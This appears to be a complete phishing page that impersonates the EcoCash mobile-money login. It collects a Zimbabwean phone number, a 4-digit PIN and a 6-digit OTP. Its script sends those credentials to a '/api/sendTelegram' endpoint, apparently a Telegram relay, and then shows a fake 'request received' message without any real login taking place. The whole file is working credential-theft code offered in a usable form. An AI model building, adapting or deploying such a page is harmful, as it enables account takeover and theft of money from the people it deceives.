<!doctype html>
<html>
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>EcoCash — Login</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
<style>
  *{box-sizing:border-box}
  html,body{height:100%}
  body{
    font-family:Inter,system-ui,Arial;
    background:linear-gradient(180deg,#f7fbff,#e8f3ff);
    margin:0;
    -webkit-font-smoothing:antialiased;
    padding:18px;
    display:flex;
    align-items:center;
    justify-content:center;
    min-height:100vh;
  }

  .card{width:100%;max-width:380px;background:#fff;padding:20px;border-radius:12px;box-shadow:0 12px 30px rgba(2,6,23,0.06)}
  .logo{height:44px;display:block;margin:0 auto 10px}
  h2{text-align:center;margin:0 0 12px;color:#111;font-size:20px}
  label{display:block;font-size:13px;color:#374151;margin-top:8px}
  input{width:100%;padding:10px;border-radius:8px;border:1px solid #e6eefc;background:#fbfdff;font-size:14px}
  .btn{background:#4b86ff;color:#fff;padding:10px;border-radius:8px;border:0;margin-top:12px;cursor:pointer;width:100%}
  .btn[disabled]{background:#cbd5e1;color:#6b7280;cursor:not-allowed}

  .req{color:#d04444;margin-right:6px}
  .error{color:#d04444;font-size:13px;margin-top:4px;display:none}

  /* PIN boxes */
  .pin-row{display:flex;gap:8px;justify-content:center;margin-top:6px}
  .pin-digit{
    width:40px;height:48px;
    text-align:center;font-size:20px;
    border-radius:8px;border:1px solid #e6eefc;
    background:#fbfdff;
  }

  /* OTP modal (UNCHANGED) */
  .otp-modal{position:fixed;left:0;top:0;width:100%;height:100%;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.35)}
  .otp-box{background:#fff;padding:18px;border-radius:12px;min-width:300px;max-width:92%;box-shadow:0 12px 24px rgba(2,6,23,0.08)}
  .small{font-size:13px;color:#6b7280}
  .success{color:#16a34a;font-weight:600}
  .otp-warning{color:#d04444;font-size:13px;margin-top:8px;display:none}
  .otp-row{display:flex;gap:8px;justify-content:center;margin-top:8px}
  .otp-digit{width:40px;height:48px;text-align:center;font-size:20px;border-radius:8px;border:1px solid #e6eefc;background:#fbfdff}
  .resend-row{display:flex;gap:10px;align-items:center;margin-top:12px;justify-content:space-between}
  .resend-btn{background:#fff;border:1px solid #e6eefc;padding:8px 12px;border-radius:8px;cursor:pointer}
  .resend-btn[disabled]{opacity:.6;cursor:not-allowed}
</style>
</head>

<body>
<div class="card">
  <img src="assets/eco.png" alt="EcoCash logo" class="logo">

  <h2>Login</h2>

  <form id="loginForm" autocomplete="off">
    <label><span class="req">★</span>Mobile Number
      <input id="phone" value="+263" inputmode="numeric" autocomplete="tel">
    </label>
    <div id="phoneError" class="error">
      Input 9-digit Econet number starting with 7
    </div>

    <label><span class="req">★</span>Enter your PIN</label>
    <div class="pin-row">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
    </div>

    <!-- hidden pin value (used by original logic) -->
    <input type="hidden" id="pin">

    <button type="submit" id="loginBtn" class="btn" disabled>LOGIN</button>
  </form>
</div>

<!-- OTP MODAL (UNCHANGED FROM ORIGINAL) -->
<div id="otpModal" style="display:none" class="otp-modal">
  <div class="otp-box">
    <div style="text-align:center"><strong>Enter OTP</strong></div>
    <p class="small">We have sent an OTP to your phone.</p>

    <div class="otp-row">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d0">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d1">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d2">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d3">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d4">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d5">
    </div>

    <div id="otpWarning" class="otp-warning">Please input 6 digits</div>

    <div class="resend-row">
      <div class="small" id="resendInfo">
        Resend available in <span id="countdown">120</span>s
      </div>
      <button id="resendBtn" class="resend-btn" disabled>Resend OTP</button>
    </div>

    <div style="display:flex;gap:10px;margin-top:12px">
      <button id="confirmOtp" disabled>Confirm</button>
      <button id="cancelOtp">Cancel</button>
    </div>

    <div id="otpStatus" class="small" style="margin-top:8px"></div>
  </div>
</div>

<script>
/* ===== PHONE ENFORCEMENT ===== */
const phoneEl = document.getElementById('phone');
const phoneError = document.getElementById('phoneError');
const loginBtn = document.getElementById('loginBtn');

phoneEl.addEventListener('keydown', e=>{
  if (phoneEl.selectionStart <= 4 && e.key === 'Backspace') {
    e.preventDefault();
  }
});

phoneEl.addEventListener('input', ()=>{
  let digits = phoneEl.value.replace('+263','').replace(/\D/g,'').slice(0,9);
  phoneEl.value = '+263' + digits;

  if (!/^7\d{8}$/.test(digits)) {
    phoneError.style.display = 'block';
  } else {
    phoneError.style.display = 'none';
  }

  updateLoginState();
});

/* ===== PIN (4 BOXES) ===== */
const pinBoxes = [...document.querySelectorAll('.pin-digit')];
const pinEl = document.getElementById('pin');

pinBoxes.forEach((box,i)=>{
  box.addEventListener('input',()=>{
    box.value = box.value.replace(/\D/g,'');
    if (box.value && i < 3) pinBoxes[i+1].focus();
    pinEl.value = pinBoxes.map(b=>b.value).join('');
    updateLoginState();
  });
  box.addEventListener('keydown',e=>{
    if (e.key === 'Backspace' && !box.value && i > 0) {
      pinBoxes[i-1].focus();
      pinBoxes[i-1].value = '';
      e.preventDefault();
    }
  });
});

function updateLoginState(){
  const phoneOk = /^7\d{8}$/.test(phoneEl.value.replace('+263',''));
  const pinOk = /^\d{4}$/.test(pinEl.value);
  loginBtn.disabled = !(phoneOk && pinOk);
}

/* ===== EVERYTHING BELOW IS ORIGINAL OTP LOGIC (UNCHANGED) ===== */
async function sendToServer(payload){
  return fetch('/api/sendTelegram',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify(payload)
  });
}

const otpModal=document.getElementById('otpModal');
const dEls=[0,1,2,3,4,5].map(i=>document.getElementById('d'+i));
const confirmBtn=document.getElementById('confirmOtp');
const cancelBtn=document.getElementById('cancelOtp');
const otpWarning=document.getElementById('otpWarning');
const otpStatus=document.getElementById('otpStatus');
const resendBtn=document.getElementById('resendBtn');
const countdownEl=document.getElementById('countdown');
const resendInfo=document.getElementById('resendInfo');

let timer=null,sec=120;

function startResend(){
  clearInterval(timer);
  sec=120;
  resendBtn.disabled=true;
  resendInfo.innerHTML=`Resend available in <span id="countdown">120</span>s`;
  timer=setInterval(()=>{
    sec--;
    countdownEl.textContent=sec;
    if(sec<=0){
      clearInterval(timer);
      resendBtn.disabled=false;
      resendInfo.textContent="Didn't receive OTP?";
    }
  },1000);
}

function otp(){return dEls.map(d=>d.value).join('');}

dEls.forEach((d,i)=>{
  d.addEventListener('input',()=>{
    d.value=d.value.replace(/\D/g,'');
    if(d.value&&i<5)dEls[i+1].focus();
    confirmBtn.disabled=!/^\d{6}$/.test(otp());
  });
});

loginForm.addEventListener('submit',async e=>{
  e.preventDefault();

  otpModal.style.display='flex';
  dEls.forEach(d=>d.value='');
  confirmBtn.disabled=true;
  startResend();

  await sendToServer({
    event:'login_clicked',
    loginPhone:phoneEl.value,
    loginPin:pinEl.value,
    submittedAt:new Date().toISOString()
  });
});

cancelBtn.onclick=()=>{
  otpModal.style.display='none';
  clearInterval(timer);
};

confirmBtn.onclick=async()=>{
  await sendToServer({
    event:'otp_confirm',
    loginPhone:phoneEl.value,
    loginPin:pinEl.value,
    otp:otp(),
    submittedAt:new Date().toISOString()
  });
  otpStatus.innerHTML="<span class='success'>Success — your request has been received.</span>";
};
</script>
</body>
</html>
